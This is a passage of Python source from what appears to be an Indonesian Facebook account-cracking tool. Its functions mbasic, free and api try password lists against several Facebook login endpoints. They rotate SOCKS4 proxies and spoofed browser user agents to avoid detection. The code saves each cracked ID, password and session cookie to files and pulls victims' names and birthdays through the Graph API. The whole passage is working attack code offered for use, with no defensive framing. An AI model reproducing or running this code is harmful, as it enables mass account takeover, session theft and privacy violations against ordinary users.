						print("\r %s*--> %s|%s|%s|%s • %s "%(K,nama_,uiz,pw,ttl,tahun(uiz)))
						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if "no" in tampilkan_ttl:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_ttl:
					try:
						coki=po.cookies.get_dict()
						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
						token = open('token.txt','r').read()
						cookie = open('cookie.txt','r').read()
						coki = {"cookie":cookie}
						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
						x = json.loads(xn.text)
						ttl = x['birthday']
						nama_ = x["name"]
						print("\r %s*--> %s|%s|%s|%s • %s "%(H,nama_,uiz,pw,ttl,tahun(uiz)))
						print("\r %s*--> %s "%(H,kuki))
						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
						ok+=1
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
				else:continue
				break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1
	
def mbasic(uiz,pwr):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	runc= random.choice([K,M,U,O,B,H])
	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks4://'+cuukk}
			#proxs2= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://mbasic.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				if "ya" in tampilkan_opsi:
					opsi_detect(uiz,pw)
				elif "no" in tampilkan_opsi:
					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
					cp+=1
					break
				if "no" in tampilkan_ttl:
					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
					cp+=1
					break
				elif "ya" in tampilkan_ttl:
					try:
						token = open('token.txt','r').read()
						cookie = open('cookie.txt','r').read()
						coki = {"cookie":cookie}
						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
						x = json.loads(xn.text)
						ttl = x['birthday']
						nama_ = x["name"]
						#id_ = x["id"]
						print("\r %s*--> %s|%s|%s|%s • %s "%(K,nama_,uiz,pw,ttl,tahun(uiz)))
						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if "ya" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					cek_apk(ses,kuki)
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "no" in tampilkan_apk:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				if "no" in tampilkan_ttl:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_ttl:
					try:
						coki=po.cookies.get_dict()
						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
						token = open('token.txt','r').read()
						cookie = open('cookie.txt','r').read()
						coki = {"cookie":cookie}
						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
						x = json.loads(xn.text)
						ttl = x['birthday']
						nama_ = x["name"]
						print("\r %s*--> %s|%s|%s|%s • %s "%(H,nama_,uiz,pw,ttl,tahun(uiz)))
						print("\r %s*--> %s "%(H,kuki))
						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
						ok+=1
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
				else:continue
				break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1
	
def free(uiz,pwr):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	runc= random.choice([K,M,U,O,B,H])
	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	for pw in pwr:
		pw = pw.lower()
		try:
			proxff= open('proxy_mat.txt','r').read().splitlines()
			cuukk=random.choice(proxff)
			proxs= {'http': 'socks4://'+cuukk}
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Ffree.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":uiz,"next":"https://free.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login/device-based/password/?uid='+uiz+'&flow=login_no_pin&next=https%3A%2F%2Ffree.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in ses.cookies.get_dict().keys():
				if "ya" in tampilkan_opsi:
					opsi_detect(uiz,pw)
				elif "no" in tampilkan_opsi:
					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
					cp+=1
					break
				if "no" in tampilkan_ttl:
					print("\r %s*--> %s|%s • %s"%(K,uiz,pw,tahun(uiz)))
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'|'+'\n')
					cp+=1
					break
				elif "ya" in tampilkan_ttl:
					try:
						token = open('token.txt','r').read()
						cookie = open('cookie.txt','r').read()
						coki = {"cookie":cookie}
						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
						x = json.loads(xn.text)
						ttl = x['birthday']
						nama_ = x["name"]
						#id_ = x["id"]
						print("\r %s*--> %s|%s|%s|%s • %s "%(K,nama_,uiz,pw,ttl,tahun(uiz)))
						open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print("\r %s*--> %s|%s • %s "%(K,uiz,pw,tahun(uiz)))
					open('CP/'+cpz,'a').write(uiz+'|'+pw+'\n')
					cp+=1
				else:continue
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if "no" in tampilkan_ttl:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
					break
				elif "ya" in tampilkan_ttl:
					try:
						coki=po.cookies.get_dict()
						kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
						token = open('token.txt','r').read()
						cookie = open('cookie.txt','r').read()
						coki = {"cookie":cookie}
						xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
						x = json.loads(xn.text)
						ttl = x['birthday']
						nama_ = x["name"]
						print("\r %s*--> %s|%s|%s|%s • %s "%(H,nama_,uiz,pw,ttl,tahun(uiz)))
						print("\r %s*--> %s "%(H,kuki))
						open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
						ok+=1
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
					print("\r %s*--> %s "%(H,kuki))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+kuki+'\n')
					ok+=1
				else:continue
				break
					
			else:
				continue
		except requests.exceptions.ConnectionError:
			turu(31)
	HikmatXD+=1

def api(uiz,pwr):
	global ok,cp,HikmatXD
	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	runc= random.choice([K,M,U,O,B,H])
	sys.stdout.write("\r %s• %scracked %s%s/%s %sok:%s %scp:%s "%(P,runc,P,len(id2 or id4),HikmatXD,H,ok,K,cp)); sys.stdout.flush()
	for pw in pwr:
		pw = pw.lower()
		proxff= open('proxy_mat.txt','r').read().splitlines()
		cuukk=random.choice(proxff)
		proxs= {'http': 'socks4://'+cuukk}
		headers = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT","x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA","user-agent": ua, "content-type": "application/x-www-form-urlencoded","x-fb-http-engine": "Liger"}
		response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uiz)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers,proxies=proxs) 
		if "session_key" in response.text and "EAAG" in response.text:
			if "no" in tampilkan_ttl:
				print("\r %s*--> %s|%s • %s"%(H,uiz,pw,tahun(uiz)))
				open('OK/'+okz,'a').write(uiz+'|'+pw+'|'+'\n')
				ok+=1
				break
			elif "ya" in tampilkan_ttl:
				try:
					token = open('token.txt','r').read()
					cookie = open('cookie.txt','r').read()
					coki = {"cookie":cookie}
					xn = requests.Session().get('https://graph.facebook.com/%s?access_token=%s'%(uiz,token),cookies=coki)
					x = json.loads(xn.text)
					ttl = x['birthday']
					nama_ = x["name"]
						#id_ = x["id"]
					print("\r %s*--> %s|%s|%s|%s • %s"%(H,nama_,uiz,pw,ttl,tahun(uiz)))
					open('OK/'+okz,'a').write(uiz+'|'+pw+'\n')
					break
				except(KeyError, IOError):
					ttl = " "
				except:pass
				print("\r %s*--> %s|%s • %s "%(H,uiz,pw,tahun(uiz)))
